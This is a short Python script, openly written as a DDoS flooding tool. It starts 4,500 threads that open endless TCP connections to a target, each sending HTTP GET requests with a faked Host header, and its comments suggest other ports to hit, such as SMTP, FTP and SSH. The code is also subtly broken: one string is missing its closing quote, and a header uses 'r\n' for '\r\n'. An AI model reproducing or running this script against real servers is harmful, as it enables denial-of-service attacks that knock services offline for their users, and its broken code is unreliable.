import socket
import threading as thr

# first the basic information

the_target = '127.0.0.1' # this is your local machine's ip(you can also put a domain name here) use only authorized servers to run this script
port = 80 # This is the http port, but you can also attack others like: smtp port 25, ftp port 21, ssh port 22 and so on..
hoax_ip = '182.88.100.56' # this is just some manufactured ip that is supposed to be a fake ip adress

# now let's define the ddos attack

def ddos():
  while True: # endless loop
    x = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is to create internet socket with ipv4 address socket, for ipv6 just put the 6 in the end, like this AF_INET6
    # SOCK_STREAM is used to create a tcp socket
    x.connect((the_target, port)) # connecting to it
    x.sendto(("GET /" + the_target + " HTTP/1.1\r\n").encode("ascii"), (the_target, port))
    x.sendto(("Host: " + hoax_ip + "r\n\r\n").encode("ascii), (the_target, port))
    x.close()
    
# now let's thread through this

for i in range(4500): # the number is for multithread
  thread = thr.Thread(target=ddos) # after the name target put the name of the function
  thread.start()
